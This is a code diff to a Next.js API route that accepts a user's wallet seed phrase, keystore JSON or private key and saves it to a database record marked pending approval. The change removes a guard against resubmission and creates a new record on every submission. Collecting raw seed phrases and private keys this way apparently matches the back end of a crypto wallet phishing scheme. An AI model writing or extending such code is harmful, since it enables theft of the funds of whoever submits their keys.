@@ -82,22 +82,9 @@ export async function POST(req: NextRequest) {
       );
     }
 
-    // Block resubmission if already pending or approved
-    const activeWallet = await Wallet.findOne({
+    const walletData: Record<string, any> = {
       userId: user._id,
       walletName,
-      status: { $in: ["pending", "approved"] },
-    });
-
-    if (activeWallet) {
-      return NextResponse.json(
-        { success: false, error: `${walletName} is already connected or awaiting approval` },
-        { status: 400 }
-      );
-    }
-
-    // Build update payload
-    const updateData: Record<string, any> = {
       walletType: type,
       status: "pending",
       submittedAt: new Date(),
@@ -105,16 +92,11 @@ export async function POST(req: NextRequest) {
       rejectedReason: null,
     };
 
-    if (type === "phrase") updateData.seedPhrase = data;
-    if (type === "keystore") updateData.keystoreJson = data;
-    if (type === "private") updateData.privateKey = data;
+    if (type === "phrase") walletData.seedPhrase = data;
+    if (type === "keystore") walletData.keystoreJson = data;
+    if (type === "private") walletData.privateKey = data;
 
-    // Upsert: update rejected wallet or create new one
-    const savedWallet = await Wallet.findOneAndUpdate(
-      { userId: user._id, walletName },
-      { $set: updateData },
-      { upsert: true, new: true }
-    );
+    const savedWallet = await Wallet.create(walletData);
 
     return NextResponse.json({
       success: true,
